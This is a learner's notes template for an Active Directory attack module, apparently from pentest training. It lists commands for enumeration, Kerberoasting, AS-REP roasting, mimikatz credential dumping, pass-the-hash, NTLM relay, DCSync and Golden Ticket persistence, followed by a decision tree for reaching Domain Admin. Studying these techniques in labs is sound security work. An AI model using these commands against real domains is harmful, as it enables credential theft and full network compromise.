# Active Directory Enumeration & Attacks

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Enumerate and attack Active Directory end to end: from no creds → a foothold user → privilege escalation / lateral movement → Domain Admin → persistence. The largest module and the core of internal pentesting.

## AD attack flow (reference)
Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).

### 1. Enumeration (always first)
Goal: users, computers, groups, misconfigs.
```bash
# no creds
nmap -p88,135,139,389,445,464,593,636,3268,3389 --script="ldap* smb*" <HOST>
smbclient -L //<DC> -N                 # null-session shares
crackmapexec smb <DC>                   # host/domain info
kerbrute userenum -d <domain> --dc <DC> users.txt    # valid users (no creds needed)
# with creds
bloodhound-python -u <u> -p <p> -d <domain> -c All -dc-ip <DC>   # map attack paths
crackmapexec ldap <DC> -u <u> -p <p> --asreproast
rpcclient -U '<u>%<p>' <DC>
net user /domain ; net group "Domain Admins" /domain    # (on a Windows foothold)
```

### 2. Get / escalate credentials
```bash
# Kerberoasting (any domain user can request SPN tickets)
GetUserSPNs.py -dc-ip <DC> <domain>/<u>:<p> -request
hashcat -m 13100 hash.txt rockyou.txt
# AS-REP Roasting (accounts with "do not require pre-auth")
GetNPUsers.py -dc-ip <DC> -usersfile users.txt <domain>/ -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
```

### 3. Lateral movement
```bash
# dump creds from a compromised host (admin)
# mimikatz: sekurlsa::logonpasswords
# Pass-the-Hash
psexec.py <domain>/<u>@<HOST> -hashes <LM>:<NT>
crackmapexec smb <range> -u <u> -H <NT>        # spray a hash across hosts
# NTLM relay (when SMB signing is disabled)
ntlmrelayx.py -t smb://<HOST> --smb2support
```

### 4. Domain compromise + persistence
```bash
whoami /groups ; net group "Domain Admins" /domain     # confirm DA
# dump all domain hashes (DCSync, needs DA or replication rights)
secretsdump.py <domain>/<admin>:<pass>@<DC>
# Golden Ticket (persistence; needs the krbtgt hash)
# mimikatz: kerberos::golden /user:Administrator /domain:<d> /sid:<SID> /krbtgt:<hash> /ptt
```

### Decision tree (what to try next)
1. **No creds?** → enumerate (kerbrute, null SMB, CME). **Have creds?** → BloodHound + CME.
2. **Kerberoast / AS-REP possible?** → grab hashes, crack offline. **No?** → lateral movement.
3. **SMB/LDAP/Kerberos misconfig?** → NTLM relay / PtH / Kerberos attacks. **No?** → local privesc on a workstation (modules 25/26).
4. **Domain Admin?** → DCSync + persistence. **No?** → pivot to another user/host, repeat.

> BloodHound is the force multiplier — it shows the *shortest path* to DA so you're not guessing. Kerberoasting + AS-REP roasting are the highest-value early wins because any domain user can attempt them. krbtgt hash = keys to the kingdom (Golden Ticket).

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
